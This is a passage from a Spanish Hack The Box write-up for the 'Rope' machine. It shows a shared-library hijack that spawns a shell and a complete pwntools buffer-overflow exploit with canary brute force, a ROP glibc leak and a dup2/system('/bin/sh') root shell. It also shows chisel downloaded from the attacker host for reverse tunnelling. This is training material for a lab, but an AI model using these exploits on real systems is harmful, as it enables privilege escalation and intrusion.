john@rope:/opt/www$ export SHELL=bash john@rope:/opt/www$ stty rows 50 columns 158  Perfecto, tenemos ejecución remota de comandos (RCE) como john.\nMovimiento lateral al usuario r4j La enumeración básica nos dice que john puede ejecutar /usr/bin/readlogs como r4j usando sudo:\njohn@rope:/opt/www$ sudo -l Matching Defaults entries for john on rope: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on rope: (r4j) NOPASSWD: /usr/bin/readlogs john@rope:/opt/www$ file /usr/bin/readlogs /usr/bin/readlogs: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, B uildID[sha1]=67bdf14148530fcc5c26260c3450077442e89f66, not stripped  Se trata de un binario ELF. Si lo ejecutamos, vemos una ristra de mensajes de log:\njohn@rope:/opt/www$ sudo -u r4j /usr/bin/readlogs Jul 19 21:00:01 rope CRON[1726]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:00:01 rope CRON[1726]: pam_unix(cron:session): session closed for user root Jul 19 21:02:01 rope CRON[1731]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:02:01 rope CRON[1731]: pam_unix(cron:session): session closed for user root Jul 19 21:04:01 rope CRON[1785]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:04:01 rope CRON[1785]: pam_unix(cron:session): session closed for user root Jul 19 21:06:01 rope CRON[1808]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:06:01 rope CRON[1808]: pam_unix(cron:session): session closed for user root Jul 19 21:06:08 rope sudo: john : TTY=pts/0 ; PWD=/opt/www ; USER=r4j ; COMMAND=/usr/bin/readlogs Jul 19 21:06:08 rope sudo: pam_unix(sudo:session): session opened for user r4j by (uid=0)  Nada interesante, la verdad. Si miramos a las librerías compartidas que usa el binario, tenemos estas:\njohn@rope:/opt/www$ ldd /usr/bin/readlogs linux-vdso.so.1 (0x00007ffd4f3e0000) liblog.so = /lib/x86_64-linux-gnu/liblog.so (0x00007fc8e6732000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc8e5f28000) /lib64/ld-linux-x86-64.so.2 (0x00007fc8e651b000)  Mirándolas una a una, vemos que liblog.so es modificable por cualquier usuario:\njohn@rope:/opt/www$ ls -l /lib/x86_64-linux-gnu/liblog.so -rwxrwxrwx 1 root root 15984 Jun 19 2019 /lib/x86_64-linux-gnu/liblog.so  Ataque de Library Hijacking Por tanto, podemos hacer un ataque de Library Hijacking e inyectar comandos maliciosos en la librería compartida, de manera que estos comandos se ejecuten como r4j. Para comenzar, podemos crear este programa en C y compilarlo como libraría compartida:\njohn@rope:/opt/www$ cd /tmp john@rope:/tmp$ vim lib.c john@rope:/tmp$ cat lib.c #include \u0026lt;unistd.h\u0026gt; void _init() { char *argv[] = {\"/bin/sh\", 0}; execve(argv[0], \u0026argv[0], NULL); } john@rope:/tmp$ gcc -shared -fpic lib.c -o /lib/x86_64-linux-gnu/liblog.so  La idea es secuestrar la ejecución del programa una vez que se cargue la librería, de ahí que se defina la función _init. Sin embargo, tenemos que definir una función llamada printlog, porque es usada por el binario:\njohn@rope:/tmp$ sudo -u r4j /usr/bin/readlogs /usr/bin/readlogs: symbol lookup error: /usr/bin/readlogs: undefined symbol: printlog  Pues vamos a cambiar _init por printlog:\njohn@rope:/tmp$ vim lib.c john@rope:/tmp$ cat lib.c #include \u0026lt;unistd.h\u0026gt; void printlog() { char *argv[] = {\"/bin/sh\", 0}; execve(argv[0], \u0026argv[0], NULL); } john@rope:/tmp$ gcc -shared -fpic lib.c -o /lib/x86_64-linux-gnu/liblog.so  Y ya tenemos una shell como r4j:\njohn@rope:/tmp$ sudo -u r4j /usr/bin/readlogs $ whoami r4j $ bash r4j@rope:/tmp$ cd /home/r4j r4j@rope:/home/r4j$ cat user.txt e81294485fad64644230fc9397b127f8  Escalada de privilegios Este usuario pertenece al grupo adm. Si miramos los archivos que pertenecen a este grupo, vemos uno sospechoso:\nr4j@rope:/tmp$ id uid=1000(r4j) gid=1000(r4j) groups=1000(r4j),4(adm) r4j@rope:/tmp$ find / -group adm 2/dev/null /opt/support /opt/support/contact /var/spool/rsyslog /var/log/unattended-upgrades /var/log/kern.log /var/log/syslog /var/log/cloud-init.log /var/log/apt/term.log /var/log/auth.log /snap/core/7270/var/log/dmesg /snap/core/7270/var/log/fsck/checkfs /snap/core/7270/var/log/fsck/checkroot /snap/core/7270/var/spool/rsyslog /snap/core/6964/var/log/dmesg /snap/core/6964/var/log/fsck/checkfs /snap/core/6964/var/log/fsck/checkroot /snap/core/6964/var/spool/rsyslog  Sí, se trata de /opt/support/contact, que es otro archivo binario:\nr4j@rope:/tmp$ ls -l /opt/support/contact -rwxr-x--- 1 root adm 14632 Jun 19 2019 /opt/support/contact r4j@rope:/tmp$ file /opt/support/contact /opt/support/contact: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f, stripped  Analizando el binario contact Si tratamos de ejecutarlo, vemos un error:\nr4j@rope:/tmp$ /opt/support/contact ERROR: Address already in use  Por tanto, podemos pensar que el binario ya está en ejecución. De hecho, si enumeramos los puertos locales abiertos, vemos que hay un proceso a la escucha en el puerto 1337:\nr4j@rope:/tmp$ netstat -nat Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN tcp 0 138 10.10.10.148:43178 10.10.17.44:4444 ESTABLISHED tcp6 0 0 :::22 :::* LISTEN  Luego, podemos listar procesos y ver que /opt/support/contact está en ejecución como usuario root:\nr4j@rope:/tmp$ ps -faux | tail r4j 1973 0.0 0.2 19680 4536 pts/0 S Jul19 0:00 | \\_ bash r4j 2319 0.0 0.1 36856 3324 pts/0 R+ 00:09 0:00 | \\_ ps -faux r4j 2320 0.0 0.0 4568 848 pts/0 S+ 00:09 0:00 | \\_ tail root 1126 0.0 0.1 57500 3148 ? S Jul19 0:00 \\_ /usr/sbin/CRON -f root 1194 0.0 0.0 4628 804 ? Ss Jul19 0:00 \\_ /bin/sh -c /opt/support/contact root 1196 0.0 0.0 4516 704 ? S Jul19 0:00 \\_ /opt/support/contact syslog 1102 0.0 0.2 267272 5112 ? Ssl Jul19 0:00 /usr/sbin/rsyslogd -n root 1116 0.0 0.3 288876 6444 ? Ssl Jul19 0:00 /usr/lib/policykit-1/polkitd --no-debug root 1148 0.0 0.0 14888 1924 tty1 Ss+ Jul19 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 1167 0.0 0.2 72296 5588 ? Ss Jul19 0:00 /usr/sbin/sshd -D  Vamos a descargar el binario a nuestra máquina de atacante para analizarlo con Ghidra:\nr4j@rope:/tmp$ which python3 /usr/bin/python3 r4j@rope:/tmp$ cd /opt/support/ r4j@rope:/opt/support$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [] \"GET /contact HTTP/1.1\" 200 -  $ wget 10.10.10.148:8000/contact  Lo primero de todo, el binario está protegido casi al completo:\n$ checksec contact [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  En Ghidra, vemos la función main:\nvoidmain() { longin_FS_OFFSET; socklen_tlocal_40; uintport; uintlocal_38; uintlocal_34; intlocal_30; intlocal_2c; sockaddr local_28; undefined8 canary; canary =*(undefined8 *) (in_FS_OFFSET +0x28); port =1337; local_40 =0x10; local_38 =FUN_00101267(1337); local_34 =local_38; if(0\u0026lt;(int) local_38) { printf(\"listen on port %d, fd is %d\\n\", (ulong) port, (ulong) local_38); signal(0xd, (__sighandler_t) 0x1); signal(0x11, (__sighandler_t) 0x1); while(true) { do{ local_30 =accept(local_38, \u0026amp;local_28, \u0026amp;local_40); } while(local_30 \u0026lt;0); local_2c =process(); if(local_2c ==1) break; close(local_30); } /* WARNING: Subroutine does not return */ exit(0); } perror(\"ERROR\"); /* WARNING: Subroutine does not return */ exit(local_38); }  De nuevo, se trata de un servidor de sockets que escucha en el puerto 1337. Cuando llega una conexión, se pasa a la función process (renombrada de FUN_001014ee):\n__pid_tprocess(uintparam_1) { longcanary; __pid_t_Var2; __uid_t_Var3; size_t__n; longin_FS_OFFSET; canary =*(long*) (in_FS_OFFSET +0x28); _Var2 =fork(); if(_Var2 ==0) { _Var3 =getuid(); printf(\"[+] Request accepted fd %d, pid %d\\n\", (ulong) param_1, (ulong)_Var3); __n =strlen(s_Please_enter_the_message_you_wan_001040e0); write(param_1, s_Please_enter_the_message_you_wan_001040e0, __n); vuln(); send(param_1, \"Done.\\n\", 6, 0); _Var2 =0; } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return_Var2; }  Básicamente, imprime mensajes a stdout y luego va a vuln (renombrada de FUN_0010159a):\nvoidvuln(intparam_1) { longin_FS_OFFSET; undefined local_48[56]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); recv(param_1, local_48, 0x400, 0); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Obviamente, si le he puesto de nombre vuln es porque hay la función es vulnerable. En efecto, existe una vulnerabilidad de Buffer Overflow ya que local_48 tiene 56 bytes asignados como buffer y recv lee hasta 0x400 (512) bytes y los guarda en local_48. Podemos probarlo en local:\n$ ./contact listen on port 1337, fd is 3  $ nc 127.0.0.1 1337 Please enter the message you want to send to admin: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  $ ./contact listen on port 1337, fd is 3 [+] Request accepted fd 4, pid 1000 *** stack smashing detected ***: terminated  No vemos un mensaje de violación de segmento (segmentation fault), pero sí vemos un *** stack smashing detected ***, que se debe a la protección del canario.\nExplotación de Buffer Overflow Vamos a dar un poco de contexto. El canario de la pila (stack canary) es un valor aleatorio calculado al comienzo del programa que se guarda en la pila antes de las copias de $rbp y $rip. Cuando una función va a retornar, el programa mira si el valor del canario en la pila coincide con el que calculó el programa en el inicio (que está guardado en una zona segura). Si los valores son diferentes, el programa asume que ha ocurrido un ataque de Buffer Overflow (stack smashing) y fuerza el fin de la ejecución del programa (__stack_chk_fail). Si no, el programa sigue.\nPor tanto, para evitar esta protección, lo que tenemos que hacer es obtener el valor del canario de alguna manera (que se calcula en tiempo de ejecución, por lo que cambia cada vez que se reinicia el programa). Luego, tendremos que ponerlo en nuestro payload, de manera que sobrescribimos el canario con el mismo valor y el programa no se dará cuenta de la explotación de Buffer Overflow.\n¿Pero cómo podemos afrontar esto? Bueno, estamos ante un servidor de sockets que usa fork cada vez que llega una nueva conexión, por lo que todo el mapa de memoria se copia del proceso padre al proceso hijo. Esto significa que el proceso que se rompe es el hijo, el padre sigue esperando nuevas conexiones. Además, el canario de la pila está configurado en el proceso padre, y se copia en el hijo. Podemos obtener el valor del canario carácter a carácter usando lo que se conoce como oráculo.\nPrimero de todo, vamos a descargar la librería Glibc y el loader de la máquina remota para tener el mismo exploit en local y en remoto:\nr4j@rope:/opt/support$ cd / r4j@rope:/$ ldd /opt/support/contact linux-vdso.so.1 (0x00007ffccd8fa000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1bc9c6b000) /lib64/ld-linux-x86-64.so.2 (0x00007f1bca05c000) r4j@rope:/$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [] \"GET /lib/x86_64-linux-gnu/libc.so.6 HTTP/1.1\" 200 - 10.10.17.44 - - [] \"GET /lib64/ld-linux-x86-64.so.2 HTTP/1.1\" 200 -  $ wget -q 10.10.10.148:8000/lib/x86_64-linux-gnu/libc.so.6 $ wget -q 10.10.10.148:8000/lib64/ld-linux-x86-64.so.2  Usando pwninit podemos parchear el binario para que use la librería y el loader indicados:\n$ pwninit --libc libc.so.6 --ld ld-linux-x86-64.so.2 --bin contact --no-template bin: contact libc: libc.so.6 ld: ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_amd64.deb setting ld-linux-x86-64.so.2executable copying contactto contact_patched running patchelf on contact_patched  Ahora tenemos contact_patched, que se comportará de manera igual al binario remoto.\nVamos a comenzar por obtener el número de bytes necesarios para acontecer la vulnerabilidad de Buffer Overflow. Una manera de hacer esto es matemáticamente (como local_48 tiene 56 bytes asignados, significa que los siguientes 8 bytes serán para el canario de la pila, luego el valor guardado de $rbp y luego el valor guardado de $rip o dirección de retorno).\nVamos a probarlo. Si introducimos exactamente 56 byte, todo está OK:\n$ python3 -c 'import os; os.write(1, b\"A\" * 56)' | nc 127.0.0.1 1337 Please enter the message you want to send to admin: Done.  $ ./contact_patched listen on port 1337, fd is 3 [+] Request accepted fd 4, pid 1000  Vamos a introducir uno nuevo:\n$ python3 -c 'import os; os.write(1, b\"A\" * 57)' | nc 127.0.0.1 1337 Please enter the message you want to send to admin:  $ ./contact_patched listen on port 1337, fd is 3 [+] Request accepted fd 4, pid 1000 *** stack smashing detected ***: \u0026lt;unknown\u0026gt; terminated  Bien, ya sabemos dónde comienza el canario. ¿Puedes ver alguna diferencia más en las respuestas? Sí, ¡tenemos un oráculo! Si el canario no se modifica, el servidor responde Done., y si no, no responde. Entonces tenemos una manera de hacer fuerza bruta carácter a carácter hasta que tengamos un mensaje Done., que significa que el byte probado es correcto y podemos pasar al siguiente byte del canario, hasta obtenerlo al completo.\nObteniendo fugas de memoria Podemos comenzar a escribir el exploit en Python con pwntools:\n#!/usr/bin/env python3 frompwnimport* context.binary=elf=ELF('contact') glibc=ELF('libc.so.6', checksec=False) defget_process(): iflen(sys.argv) !=2: log.error(f'Usage: python3 {sys.argv[0]}\u0026lt;ip:port\u0026gt;') host, port=sys.argv[1].split(':') returnremote(host, int(port)) defmain(): offset=56 junk=b'A'*offset canary=b'' canary_prog=log.progress('Canary') whilelen(canary) \u0026lt;8: forbinrange(256): withcontext.local(log_level='CRITICAL'): p=get_process() test_canary=canary+p8(b) canary_prog.status(test_canary.hex()) p.sendafter(b'admin:\\n', junk+test_canary) try: ifb'Done.'inp.recv(): canary=test_canary break exceptEOFError: pass finally: withcontext.local(log_level='CRITICAL'): p.close() canary_prog.success(canary.hex()) if__name__=='__main__': main()  Después de algunos minutos, tenemos el canario:\n$ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary: 00a473852a55d816  Ahora que hemos fugado el canario, somos capaces de explotar la vulnerabilidad de Buffer Overflow. Sabemos que se trata del canario porque contiene un byte nulo al principio, que previene que sea fugado como una string (las strings en C terminan en un byte nulo). Además, mientras que no paremos el servidor, el valor del canario o podemos poner hard-coded en el exploit para ahorrar tiempo, ya que no va a cambiar.\nLa siguiente protección que tenemos que burlar es PIE, que significa que el ASLR afecta a las direcciones del propio binario. Por tanto, tenemos que fugar una dirección del binario en tiempo de ejecución para calcular la dirección base.\nDe momento, la única cosa que podemos hacer para fugar una dirección es continuar con el ataque de fuerza bruta para fugar los valor guardados de $rbp y $rip. Sabemos que vuln retornará a process, por lo que la dirección de retorno está en process (y por tanto, forma parte del binario).\nPodemos seguir usando el mismo oráculo porque $rbp y $rip se utilizan por el programa para controlar la pila y el flujo de ejecución, respectivamente. Si modificamos un solo byte de ellos, es muy probable que programa se corrompa, consiguiendo el mismo oráculo que antes.\nEn este punto, podemos extraer el código de fuerza bruta a una función para llamarla tres veces:\ndefbrute_force_value(payload: bytes, name: str, start: bytes=b'') -\u0026gt; bytes: value = start value_prog=log.progress(name) whilelen(value) \u0026lt;8: forbinrange(256): withcontext.local(log_level='CRITICAL'): p=get_process() test_value=value+p8(b) value_prog.status(test_value.hex()) p.sendafter(b'admin:\\n', payload+test_value) try: ifb'Done.'inp.recv(timeout=1): value=test_value break exceptEOFError: pass finally: withcontext.local(log_level='CRITICAL'): p.close() value_prog.success(value.hex()) return value defmain(): offset=56 junk=b'A'*offset canary=brute_force_value(junk, 'Canary ', start=b'\\0') saved_rbp=brute_force_value(junk+canary, 'Saved $rbp') saved_rip=brute_force_value(junk+canary+saved_rbp, 'Saved $rip', start=b'\\x62')  $ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000  Y ahí tenemos las fugas de memoria (nótese que están invertidas). Usé un parámetro start para darle al proceso de fuerza bruta un byte fijo sobre el que empezar, porque se sabe de antemano que siempre va a ser ese valor. Para ahorrar tiempo, podemos poner estos valores hard-coded en el script, y así no tenemos que hacer la fuerza bruta de nuevo.\nAhora podemos calcular la dirección base del binario, porque sabemos que vuln vuelve a 0x1562 (de Ghidra). Podemos también verlo con objdump (send se llama justo después de vuln, pero el binario no muestra los nombres de funciones porque fue despojado de sus símbolos, stripped):\n$ objdump -M intel -d contact | grep -B 6 send 0000000000001090 \u0026lt;htons@plt\u0026gt;: 1090: ff 25 b2 2f 00 00 jmp QWORD PTR [rip+0x2fb2] # 4048 \u0026lt;__cxa_finalize@plt+0x2ed8\u0026gt; 1096: 68 06 00 00 00 push 0x6 109b: e9 80 ff ff ff jmp 1020 \u0026lt;recv@plt-0x10\u0026gt; 00000000000010a0 \u0026lt;send@plt\u0026gt;: -- 155d: e8 38 00 00 00 call 159a \u0026lt;__cxa_finalize@plt+0x42a\u0026gt; 1562: 8b 45 ec mov eax,DWORD PTR [rbp-0x14] 1565: b9 00 00 00 00 mov ecx,0x0 156a: ba 06 00 00 00 mov edx,0x6 156f: 48 8d 35 26 0b 00 00 lea rsi,[rip+0xb26] # 209c \u0026lt;__cxa_finalize@plt+0xf2c\u0026gt; 1576: 89 c7 mov edi,eax 1578: e8 23 fb ff ff call 10a0 \u0026lt;send@plt\u0026gt;  Esta es la dirección base del binario:\nelf.address=u64(saved_rip) -0x1562 log.success(f'ELF base address: {hex(elf.address)}')  $ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000 [+] ELF base address: 0x55dd6a405000  Como comprobación, si la dirección base del binario termina en 000, entonces generalmente será correcta. Si no, hay un error en algún lado.\nAtaque Ret2Libc Ahora que tenemos la dirección base del binario, podemos calcular cualquier dirección del binario usando los offsets correspondientes. Como NX está activa, tenemos que usar Return Oriented Programming (ROP) para ejecutar código arbitrario. Esta técnica hace uso de gadgets, que son direcciones a instrucciones que terminan en ret, de manera que al ser puestas en la pila sobrescribiendo la dirección de retorno, se van ejecutando una detrás de otra (por eso estos payloads se conocen como cadenas ROP o ROP chains). Con ROP, el programa estará saltando a direcciones ejecutables del binario, burlando así la protección NX.\nEl propósito del exploit es realizar un ataque Ret2Libc, que consiste en ejecutar funciones de Glibc. Para ello, necesitamos otra fuga de memoria para burlar el ASLR. La fuga de memoria se tiene que hacer con puts usando como primer argumento una dirección de la GOT. Como se vio anteriormente, la GOT contiene las direcciones de las funciones externas en tiempo de ejecución. Como las strings en C son punteros, si pasamos una dirección de la GOT a puts, esta función imprimirá el valor guardado en dicha dirección, derivando el la fuga de memoria de una función de Glibc.\nPara llamar a una función como puts (que es externa), podemos usar la Tabla de Enlaces a Procedimientos (Procedure Linkage Table, PLT), que es una tabla dentro del binario que realiza un salto a la dirección de la función correspondiente.\nLuego, tenemos que indicar el parámetro de puts. Como estamos ante un binario de 64 bits, la convención de llamadas a funciones dice que los parámetros de las funciones van en los registros (en orden: $rdi, $rsi, $rdx, $rcx\u0026hellip;). Hay un gadget útil pop rdi; ret que podemos usar para añadir un valor dado a $rdi tomado de la pila.\nEl procedimiento anterior es la forma clásica de fugar una dirección para posteriormente continuar con un ataque Ret2Libc. Esta vez, es algo distinto. No estamos ejecutando el binario, sino conectándonos a un socket, por lo que no podemos leer de stdout. Entonces, en lugar de puts, tenemos que llamar a write y pasarle el descriptor de archivo del socket (normalmente, 4) como primer argumento, la string a imprimir como segundo argumento, y la longitud de la string como tercer argumento.\nEstos son los valores que necesitaremos:\n Gadgets pop rdi; ret (offset 0x164b), pop rsi; pop r15; ret (offset 0x1649), pop rdx; ret (offset 0x1265). Nótese que para configurar $rsi tendremos que poner un valor cualquiera en $r15:  $ ROPgadget --binary contact | grep 'pop r[ds][ix]' 0x000000000000164b : pop rdi ; ret 0x0000000000001265 : pop rdx ; ret 0x0000000000001649 : pop rsi ; pop r15 ; ret   Una función para hacer el leak (fuga de memoria), por ejemplo send en la GOT (offset 0x4050):  $ readelf -r contact | grep send 000000004050 000900000007 R_X86_64_JUMP_SLO 0000000000000000 send@GLIBC_2.2.5 + 0 $ objdump -M intel -R contact | grep send 0000000000004050 R_X86_64_JUMP_SLOT send@GLIBC_2.2.5   write en la PLT (offset 0x1050):  $ objdump -M intel -d contact | grep '\u0026lt;write@plt\u0026gt;' 0000000000001050 \u0026lt;write@plt\u0026gt;: 154e: e8 fd fa ff ff call 1050 \u0026lt;write@plt\u0026gt;  Todos los valores anteriores se pueden usar para desarrollar el exploit de forma más manual. Esta vez, usaré las funciones de pwntools, porque sabemos lo que estamos haciendo:\nrop=ROP(elf) socket_fd=4 payload=junk payload+=canary payload+=saved_rbp payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(socket_fd) payload+=p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]) payload+=p64(elf.got.send) payload+=p64(0) payload+=p64(rop.find_gadget(['pop rdx', 'ret'])[0]) payload+=p64(8) payload+=p64(elf.plt.write) withcontext.local(log_level='CRITICAL'): p=get_process() p.sendlineafter(b'admin:\\n', payload) send_addr=u64(p.recv().ljust(8, b'\\0')) glibc.address=send_addr-glibc.symbols.send p.close() log.success(f'Leaked send() address: {hex(send_addr)}') log.success(f'Glibc base address : {hex(glibc.address)}')  Y así, obtenemos la fuga de memoria y podemos calcular la dirección base de Glibc (restando el offset de send):\n$ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000 [+] ELF base address: 0x55dd6a405000 [*] Loaded 15 cached gadgets for 'contact' [+] Leaked send() address: 0x7f86cf406c30 [+] Glibc base address : 0x7f86cf2e4000  De nuevo, como comprobación, tenemos que verificar que la dirección base de Glibc termina en 000 en hexadecimal.\nEl offset de send en Glibc se puede obtener manualmente como sigue (offset 0x122c30):\n$ readelf -s libc.so.6 | grep send$ 4239: 0000000000122c30 185 FUNC LOCAL DEFAULT 13 __libc_send 5010: 0000000000122c30 185 FUNC LOCAL DEFAULT 13 __GI___send 6755: 0000000000122c30 185 FUNC WEAK DEFAULT 13 send 7504: 0000000000122c30 185 FUNC GLOBAL DEFAULT 13 __send  En este punto, solamente queda realizar el ataque Ret2Libc, que es básicamente llamar a system(\u0026quot;/bin/sh) para conseguir una shell. Como tenemos la dirección base de Glibc, podemos calcular las direcciones de system y \u0026quot;/bin/sh\u0026quot; en tiempo de ejecución usando los offsets correspondientes (0x4f440 y 0x1b3e9a, respectivamente):\n$ readelf -s libc.so.6 | grep system$ 504: 000000000004eeb0 1200 FUNC LOCAL DEFAULT 13 do_system 6032: 000000000004f440 45 FUNC WEAK DEFAULT 13 system 6696: 000000000004f440 45 FUNC GLOBAL DEFAULT 13 __libc_system $ strings -atx libc.so.6 | grep /bin/sh 1b3e9a /bin/sh  No obstante, esta técnica solo funciona en un reto típico de Ret2Libc. Esta vez, si usamos este procedimiento, la shell se abrirá en el lado servidor. Para poder conseguir una shell interactiva, tenemos que duplicar los descriptores de archivo, de manera que stdin (descriptor de archivo 0), stdout (descriptor de archivo 1) y stderr (descriptor de archivo 2) ase copian al descriptor de archivo del socket (que es 4). Esta operación se puede hacer con dup2 de Glibc, que recibe como primer argumento el descriptor de archivo antiguo y como segundo argumento el descriptor de archivo nuevo. La idea de esto es mapear 4 -\u0026gt; 0, 4 -\u0026gt; 1 y 4 -\u0026gt; 2. Entonces, la ROP chain se hace un poco más larga.\nEste es el offset de dup2 en Glibc (0x1109a0):\n$ readelf -s libc.so.6 | grep dup2$ 3623: 00000000001109a0 33 FUNC LOCAL DEFAULT 13 __GI___dup2 3726: 00000000001109a0 33 FUNC LOCAL DEFAULT 13 __GI_dup2 5583: 00000000001109a0 33 FUNC WEAK DEFAULT 13 dup2 5595: 00000000001109a0 33 FUNC GLOBAL DEFAULT 13 __dup2  Y esta es la ROP chain completa para obtener una shell (he usado la propia Glibc para conseguir gadgets de ROP también):\nrop=ROP([elf, glibc]) payload=junk payload+=canary payload+=saved_rbp forfdin[0, 1, 2]: payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(socket_fd) payload+=p64(rop.find_gadget(['pop rsi', 'ret'])[0]) payload+=p64(fd) payload+=p64(glibc.symbols.dup2) payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(next(glibc.search(b'/bin/sh'))) payload+=p64(glibc.symbols.system) withcontext.local(log_level='CRITICAL'): p=get_process() p.sendlineafter(b'admin:\\n', payload) print() p.interactive()  Y obtenemos una shell interactiva en nuestro entorno local:\n$ python3 root_exploit.py 127.0.0.1:1337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00a473852a55d816 [+] Saved $rbp: 00d42e79ff7f0000 [+] Saved $rip: 6265406add550000 [+] ELF base address: 0x55dd6a405000 [*] Loaded 15 cached gadgets for 'contact' [+] Leaked send() address: 0x7f86cf406c30 [+] Glibc base address : 0x7f86cf2e4000 [*] Loaded 198 cached gadgets for 'libc.so.6' [*] Switching to interactive mode $ whoami rocky $ ls contact contact_patched fmtstr_exploit.py httpserver ld-linux-x86-64.so.2 libc-2.27.so libc.so.6 root_exploit.py  Ya va siendo hora de lanzar el exploit en remoto.\nReenvío de puertos Como el binario está corriendo localmente en 127.0.0.1:1337, tendremos que usar un reenvío de puertos. Esto se puede realizar con chisel:\nr4j@rope:/tmp$ wget -q 10.10.17.44/chisel r4j@rope:/tmp$ chmod +x chisel r4j@rope:/tmp$ ./chisel client 10.10.17.44:1234 R:31337:127.0.0.1:1337 client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 32.402246ms)  $ ./chisel server -p 1234 --reverse server: Reverse tunnelling enabled server: Fingerprint FLlc9PM/TqWSYH1qDJuLl55hSejclXF+Nik/RhshHrc= server: Listening on http://0.0.0.0:1234 server: session#1: tun: proxy#R:31337=\u0026gt;1337: Listening  Después de algunos minutos de fuerza bruta, finalmente obtendremos una shell como root:\n$ python3 root_exploit.py 127.0.0.1:31337 [*] './contact' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Canary : 00fbee3a3e3cc553 [+] Saved $rbp: 503afae5fc7f0000 [+] Saved $rip: 62750eaf8e550000 [+] ELF base address: 0x558eaf0e6000 [*] Loaded 15 cached gadgets for 'contact' [+] Leaked send() address: 0x7f0645e13c30 [+] Glibc base address : 0x7f0645cf1000 [*] Loaded 198 cached gadgets for 'libc.so.6' [*] Switching to interactive mode $ whoami root $ cat /root/root.txt 9d184e53053f4678beb271e733de867e  El exploit completo se puede encontrar aquí: root_exploit.py.\n","image":"/images/HTB/Rope/Rope.png","permalink":"https://7rocky.github.io/htb/rope/","section":"htb","summary":"Hack The Box. Linux. Máquina insana. Esta máquina expone un servidor web que es vulnerable a navegación de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Después de analizar el binario, descubrimos que tiene una vulnerabilidad de Format String que puede ser explotada para conseguir RCE como john. Este usuario puede ejecutar otro binario como el usuario r4j. Este binario utiliza una librería externa que podemos modificar debido a los permisos que tiene y ganar acceso como r4j. Finalmente, existe otro binario que ejecuta un servidor de sockets en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de Buffer Overflow. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como root","time":32,"title":"Rope"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.10.161   Fecha: 12 / 10 / 2019   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.161 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49940 Nmap scan report for htb.local (10.10.10.161) Host is up (0.10s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: ) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open 